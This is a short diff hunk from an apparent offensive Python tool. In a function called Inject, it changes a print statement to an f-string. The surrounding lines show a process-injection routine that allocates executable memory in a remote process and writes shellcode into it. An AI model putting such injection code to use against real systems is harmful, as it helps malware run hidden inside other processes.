@@ -788,7 +788,7 @@ def Inject(path, shellcode):
 
     # allocate RWX memory
     lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
-    print('[+] - Allocated remote memory at ', hex(lpBuffer))
+    print(f'[+] - Allocated remote memory at {hex(lpBuffer)}')
 
     # write shellcode in allocated memory
     res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
